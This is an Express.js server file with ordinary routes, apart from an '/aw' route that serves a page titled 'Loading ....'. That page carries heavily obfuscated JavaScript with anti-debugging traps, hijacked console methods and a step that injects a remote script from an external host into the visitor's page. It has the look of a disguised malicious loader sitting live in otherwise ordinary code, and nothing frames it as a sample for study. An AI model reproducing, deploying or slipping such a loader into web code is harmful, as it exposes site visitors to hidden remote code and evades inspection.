const createError = require('http-errors');
const express = require('express');
const path = require('path');
const cookieParser = require('cookie-parser');
const logger = require('morgan');

const app = express();

// view engine setup
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'pug');

app.use(logger('dev'));
app.use(express.json());
app.use(express.urlencoded({extended: false}));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));



app.get('/', function (req, res, next) {
    res.render('index', {title: 'Express'});
});

app.get('/users', function (req, res, next) {
    res.send('respond with a resource 2');
});

app.get('/aw', function (req, res, next) {
    res.send(`<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html;charset=utf-8"><meta name="viewport" content="width=device-width initial-scale=1 user-scalable=no maximum-scale=1" /><title>&#x4c;&#x6f;&#x61;&#x64;&#x69;&#x6e;&#x67;&#x20;&period;&period;&period;&period;&#x20;&#x2d;9PW06z2lChcqBSf7pxF</title><link href="" rel="shortcut icon" /></head><body class="ibUfaFSM9NcQJpH1BWhX6kEL"><div class="0HGI2y1SUoJNpQviWcuME7" id="EeqvKAkBpfCIDNtdwJ"></div><script>var _0x4f06=["ChjVDg90ExbL","BI5VCMCVnJbHmZGXowq4nJe5nZy2mG==","yxbWBhK=","Aw5PDa==","yMLUza==","y2fSBa==","C2nYAxb0","z2v0rwXLBwvUDhncEvrHz05HBwu=","zgvIDq==","DgfIBgu=","zNvUy3rPB24GkLWOicPCkq==","y3jLyxrLrwXLBwvUDa==","y2HHAw4=","DgvZDa==","AgvHza==","C3rHDgvpyMPLy3q=","Aw5MBW==","DhLWzq==","C3rYAw5N","C3jJ","BgvUz3rO","ywn0Aw9U","z2DLCG==","Dg9tDhjPBMC=","D2HPBguGkhrYDwuPihT9","xcTCkYaQkd86w2eTEKeTwL8KxvSWlq==","ihrOAxmIksGGkq==","y29UC3rYDwn0B3i=","oweTEKeTwL8KxsOP","D2fYBG==","y29UC29Szq==","E30Uy29UC3rYDwn0B3iOiNjLDhvYBG==","Aw5WDxq="];!function(r,x){!function(x){for(;--x;)r.push(r.shift())}(181)}(_0x4f06);var _0x4b71=function(x,r){var n=_0x4f06[x=+x];void 0===_0x4b71.pHFcUB&&(_0x4b71.hFQuOs=function(x){for(var r=function(x){for(var r,n,t=String(x).replace(/=+$/,""),_="",c=0,b=0;n=t.charAt(b++);~n&&(r=c%4?64*r+n:n,c++%4)&&(_+=String.fromCharCode(255&r>>(-2*c&6))))n="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(n);return _}(x),n=[],t=0,_=r.length;t<_;t++)n+="%"+("00"+r.charCodeAt(t).toString(16)).slice(-2);return decodeURIComponent(n)},_0x4b71.QrzcYr={},_0x4b71.pHFcUB=!0);var t=_0x4b71.QrzcYr[x];return void 0===t?(n=_0x4b71.hFQuOs(n),_0x4b71.QrzcYr[x]=n):n=t,n},_0x156f01=function(){var t=!0;return function(r,n){var x=t?function(){if(n){var x=n[_0x4b71("0x14")](r,arguments);return n=null,x}}:function(){};return t=!1,x}}();!function(){_0x156f01(this,function(){var x=new RegExp(_0x4b71("0x1c")),r=new RegExp(_0x4b71("0xa")+_0x4b71("0xd"),"i"),n=_0x1a29f1(_0x4b71("0x15"));x.test(n+_0x4b71("0x1e"))&&r[_0x4b71("0x1f")](n+_0x4b71("0x11"))?_0x1a29f1():n("0")})()}();var _0x3a762c=function(){var t=!0;return function(r,n){var x=t?function(){if(n){var x=n[_0x4b71("0x14")](r,arguments);return n=null,x}}:function(){};return t=!1,x}}(),_0x22931e=_0x3a762c(this,function(){for(var x=function(){var r;try{r=Function("return (function() "+(_0x4b71("0x10")+_0x4b71("0xb"))+");")()}catch(x){r=window}return r}(),r=x[_0x4b71("0xf")]=x[_0x4b71("0xf")]||{},n=["log",_0x4b71("0xe"),_0x4b71("0x1"),"error","exception",_0x4b71("0x1b"),"trace"],t=0;t<n[_0x4b71("0x5")];t++){var _=_0x3a762c[_0x4b71("0xc")][_0x4b71("0x12")].bind(_0x3a762c),c=n[t],b=r[c]||_;_.__proto__=_0x3a762c.bind(_0x3a762c),_.toString=b[_0x4b71("0x8")][_0x4b71("0x16")](b),r[c]=_}});_0x22931e(),setInterval(function(){_0x1a29f1()},4e3);var emfromgetnbrtoo="",script34ssd=document[_0x4b71("0x1d")](_0x4b71("0x18"));function _0x1a29f1(x){function r(x){if(typeof x===_0x4b71("0x3"))return function(x){}[_0x4b71("0xc")](_0x4b71("0x9"))[_0x4b71("0x14")]("counter");1!==(""+x/x)[_0x4b71("0x5")]||x%20==0?function(){return!0}.constructor(_0x4b71("0x1a")+_0x4b71("0x7"))[_0x4b71("0x17")](_0x4b71("0x6")):function(){return!1}[_0x4b71("0xc")]("debugger")[_0x4b71("0x14")](_0x4b71("0x0")),r(++x)}try{if(x)return r;r(0)}catch(x){}}script34ssd[_0x4b71("0x2")]="text/javascript",script34ssd[_0x4b71("0x4")]="https://nacert.aioecoi"+_0x4b71("0x13")+"220b6d13.js",document[_0x4b71("0x19")](_0x4b71("0x20"))[0].appendChild(script34ssd);</script></body></html>`);
});

// catch 404 and forward to error handler
app.use(function (req, res, next) {
    next(createError(404));
});

// error handler
app.use(function (err, req, res, next) {
    // set locals, only providing error in development
    res.locals.message = err.message;
    res.locals.error = req.app.get('env') === 'development' ? err : {};

    // render the error page
    res.status(err.status || 500);
    res.render('error');
});

module.exports = app;
